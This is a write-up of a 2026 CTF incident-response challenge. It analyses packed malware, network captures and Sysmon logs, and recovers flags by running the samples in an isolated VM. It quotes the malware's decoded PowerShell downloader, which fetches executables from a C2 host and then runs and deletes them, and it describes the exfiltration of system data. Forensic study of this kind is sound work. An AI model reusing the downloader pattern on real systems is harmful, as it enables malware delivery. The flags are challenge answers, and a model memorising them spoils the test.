# WhiteHat 2026 Qualifier — Incident Response (IR-01 ~ IR-05) Write-up

> An attacker broke into a victim PC and ran malware to collect information.
> Analyze the given malware (`Desktop/MALWARE/tmp04a4d3.exe`) and the network log (`Desktop/LOG`) to get the flags.
> Flag format: `flag{...}`

## Flags

| # | Task | Malware | C2 port | Flag |
|---|------|---------|---------|------|
| 1 | System info exfiltration | `tmp04a4d3.exe` | 5001 | `flag{r0lling_x0r_w1th_p0s_c0unter}` |
| 2 | Service list | `appverify.exe` | 5002 | `flag{aff1ne_mul_add_mod256_inv3rse}` |
| 3 | Process list | `backup.exe` | 5003 | `flag{perm_sb0x_n1bble_r0t_x0r_m1x}` |
| 4 | Firewall rule list | `dlink.exe` | 5004 | `flag{fe1stel_8round_x0r_add_n3t}` |
| 5 | IP configuration | `edgex.exe` | 5005 | `flag{cbc_fe3dback_lcg_add_cha1n}` |

The decrypted data holds the flags as `FLAG{...}`. They were submitted in the required `flag{...}` form.

---

## 1. Getting the evidence

The challenge file `2026_whitehat_qual.7z` (10.4 GB, password-protected, encrypted headers) contains a whole VMware VM:

```
2026_whitehat_qual/
├── prob_qual-cl1.vmdk              (21 GB, monolithicSparse, 64 GB virtual disk)
├── prob_qual_release_2026.vmx / .nvram / .vmsd / .scoreboard
├── vmware.log, mksSandbox.log
```

The disk is GPT with three partitions (EFI / MSR / NTFS at LBA `673792`). 7-Zip cannot open an NTFS partition nested inside a VMDK without extracting all 64 GB, so the files were read directly with the Python `dissect` libraries (`dissect.hypervisor` + `dissect.ntfs`).

> Note: on Python 3.15, `dissect.cstruct` fails with `ValueError: Cannot use capturing groups in re.Scanner`. Patching `re.Scanner` to skip that check is enough.

```python
from dissect.hypervisor.disk.vmdk import VMDK
from dissect.util.stream import RangeStream
from dissect.ntfs import NTFS

disk = VMDK(open("prob_qual-cl1.vmdk", "rb"))
ntfs = NTFS(RangeStream(disk, 673792 * 512, (125827071 - 673792 + 1) * 512))
ntfs.mft.get("Users/user/Desktop/MALWARE/tmp04a4d3.exe").open().read()
```

Files extracted from `C:\Users\user\Desktop\`:

| File | Size |
|---|---|
| `MALWARE/tmp04a4d3.exe` | 22,357,504 bytes |
| `LOG/network_log.pcapng` | 125,033,980 bytes |
| `TOOL/` | Ghidra, HxD, Sysinternals, Wireshark (analyst tools, not evidence) |

All malware samples are **PE32+ x64 packed with Themida** (`.themida` and `.boot` sections, entropy ≈ 7.96), so static string analysis gives nothing useful.

---

## 2. Network log overview

| Host | Role |
|---|---|
| `192.168.158.135` (`DESKTOP-V1D12LA`) | Victim |
| `192.168.158.130` | C2 server |

Relevant TCP conversations between victim and C2:

| Port | Requests | Notes |
|---|---|---|
| 5001 | `POST /chat` (3879 B, encrypted) → `OK` | IR-01 exfiltration |
| 8000 | `GET /appverify`, `/backup`, `/dlink`, `/edgex` | Python `SimpleHTTP` serving 4 PE payloads (22–28 MB) |
| 5002 | `GET /data` (232 B encrypted) → `POST /report` (`OK\|` + plaintext) | IR-02 |
| 5003 | `GET /data` (251 B) → `POST /report` | IR-03 |
| 5004 | `GET /data` (294 B) → `POST /report` | IR-04 |
| 5005 | `GET /data` (203 B) → `POST /report` | IR-05 |

The four payloads were carved out of the port-8000 HTTP responses.

Note that **the `/report` uploads on ports 5002–5005 are plaintext** (`OK|` followed by PowerShell table output). The encrypted part of each exchange is the `/data` blob that the C2 sends *to* the victim.

---

## 3. Timeline from Sysmon

The victim had Sysmon installed (`Sysmon64` shows up in the service list). Parsing `Microsoft-Windows-Sysmon%4Operational.evtx` from the VM disk (with `python-evtx`) gives the full attack chain, including the base64 `-EncodedCommand` arguments:

| UTC (2026-10-27) | Process | Action |
|---|---|---|
| 16:03:10 | `tmp04a4d3.exe` | started from Explorer |
| 16:03:18 | → `cmd /c systeminfo` | |
| 16:03:20 | → `cmd /c ipconfig /all` | |
| 16:03:20 | → `cmd /c powershell -Enc …` | downloader (below) |
| 16:04:00 | `%TEMP%\appverify.exe` | → `Get-Service \| Select-Object Name` |
| 16:04:54 | `%TEMP%\backup.exe` | → `Get-Process \| Select-Object ProcessName` |
| 16:05:47 | `%TEMP%\dlink.exe` | → `Get-NetFirewallRule \| Select-Object DisplayName, Enabled` |
| 16:06:38 | `%TEMP%\edgex.exe` | → `Get-NetIPConfiguration` |

The decoded downloader launched by `tmp04a4d3.exe`:

```powershell
foreach ($name in @("appverify", "backup", "dlink", "edgex")) {
    $path = Join-Path $env:TEMP "$name.exe"
    Invoke-WebRequest -Uri "http://192.168.158.130:8000/$name" -OutFile $path
    $process = Start-Process -FilePath $path -PassThru -Wait
    Remove-Item -Path $path -Force
}
```

Each stage runs:

```
cmd.exe /c powershell.exe -NoLogo -NoProfile -NonInteractive -EncodedCommand <b64> 2>&1
```

and the script is always `$ProgressPreference = 'SilentlyContinue'` followed by the recon command. This maps each executable to its C2 port and its question.

---

## 4. IR-01 — `tmp04a4d3.exe` (port 5001)

The first stage collects `systeminfo`, `ipconfig /all` and the contents of a `flag.txt`, then encrypts them and sends the result in `POST /chat`.

After unpacking (key routine at `VA 0x140001000`, mask at `0x140001070`, buffer routine at `0x1400010B0`), the cipher is a rolling XOR with a position-dependent mask:

```python
KEY  = b"K3yStr1"          # stored obfuscated: key[i] = img[0x1C3A7+i] ^ 0xA5 ^ (27*i & 0xFF)
mask = lambda i: (7*i*i + 13*i + 59) & 0xFF
plain = bytes(c ^ KEY[i % 7] ^ mask(i) for i, c in enumerate(body))   # i counts from the first body byte
```

Decrypting the 3879-byte body gives:

```
=== systeminfo ===
Host Name:                 DESKTOP-V1D12LA
...
=== ipconfig ===
...
=== secret ===
FLAG{r0lling_x0r_w1th_p0s_c0unter}
```

The ciphertext is deterministic (fixed key, no nonce). Running the sample again in the same VM produces a body whose first 523 bytes match the capture byte for byte.

---

## 5. IR-02 ~ IR-05 — stage payloads (ports 5002–5005)

### 5.1 Protocol

For every stage:

1. `GET /data` → C2 returns an encrypted blob.
2. The malware decrypts the blob, takes the base64 PowerShell command out of it, and runs it through `cmd /c powershell.exe … -EncodedCommand`.
3. `POST /report` with `OK|<output>` (or `FAIL`).

The blob lengths are always about 35 bytes longer than the base64 command (232 vs 196, 251 vs 216, 294 vs 260, 203 vs 168). The keystream recovered from the known command has no structure: no repeating key and no IR-01-style quadratic mask. Each stage uses a different, stronger cipher, so they were solved **dynamically**, as the hint suggested ("run the malware").

Swapping in another stage's blob (for example, serving the 5003 blob to `appverify.exe`) makes the sample report `FAIL` and spawn no process. So each blob is encrypted with a key specific to its executable.

### 5.2 Dynamic setup

All of this ran inside the challenge's own VM, re-hosted in VirtualBox. The NIC was on an internal-only network, with no internet access and no host network.

1. **Fake C2.** Give the guest both `192.168.158.135` and `192.168.158.130`. Run a small PowerShell `TcpListener` per port that replays the exact recorded HTTP responses from the pcap (`/data` blob first, then the `/report` reply).
2. **Freeze the malware at the right moment.** A stage normally goes from `GET /data` to `POST /report` in about 3 seconds, too fast to catch with a memory dump. Setting an IFEO debugger on PowerShell inside the guest fixes this:

   ```powershell
   $k='HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell.exe'
   New-Item $k -Force; New-ItemProperty $k -Name Debugger -Value notepad.exe
   ```

   The malware decrypts the blob and then calls `cmd /c powershell.exe …`. `powershell.exe` is redirected to Notepad, which never returns, so the malware process blocks with the decrypted buffer still in memory. (Start the fake-C2 PowerShell listeners **before** setting IFEO.)
3. **Dump guest RAM** from the host and search it:

   ```bash
   VBoxManage debugvm <vm> dumpvmcore --filename core.elf
   ```

   ```python
   re.finditer(rb'(?i)flag\{[ -~]{3,80}?\}\|[A-Za-z0-9+/=]{20,}', mm)
   ```

### 5.3 Results

The decrypted `/data` plaintext has the form `FLAG{...}|<base64 command>`. The malware ignores everything before `|`.

```
FLAG{aff1ne_mul_add_mod256_inv3rse}|JABQAHIA...ATgBhAG0AZQA=            (232 B)  appverify → Get-Service
FLAG{perm_sb0x_n1bble_r0t_x0r_m1x}|JABQAHIA...cwBOAGEAbQBlAA==          (251 B)  backup    → Get-Process
FLAG{fe1stel_8round_x0r_add_n3t}|JABQAHIA...RQBuAGEAYgBsAGUAZAA=        (294 B)  dlink     → Get-NetFirewallRule
FLAG{cbc_fe3dback_lcg_add_cha1n}|JABQAHIA...dABpAG8AbgA=                (203 B)  edgex     → Get-NetIPConfiguration
```

Checks:
- Each plaintext length equals the matching captured blob length.
- Each base64 tail decodes to the command that Sysmon recorded for that executable.

The flag names also describe each stage's cipher: affine mod 256, S-box/nibble rotation, an 8-round Feistel network, and CBC-style feedback with an LCG. These were not reversed statically. The flags come from the runtime-decrypted buffers.

---

## 6. Pitfalls worth noting

- The VM disk is 64 GB of virtual space. Read NTFS straight out of the VMDK instead of extracting the partition.
- Do not trust the task text's "the results were encrypted and sent": in IR-02~05 the upload is plaintext, and the secret is in the C2's downstream `/data` blob.
- The guest is slow right after boot. `VBoxManage keyboardputstring` drops `"` and turns `::` into `:::`, so type single quotes and avoid static-member syntax.
- A new PowerShell window started with `Start-Process` steals keyboard focus. Use `-WindowStyle Hidden`, and do not send Ctrl+C blindly, because it may kill your fake C2.

## Tools

Python (`dissect`, `scapy`, `python-evtx`, `pycryptodome`), 7-Zip, VirtualBox (`dumpvmcore`), and Sysmon logs from the evidence image.
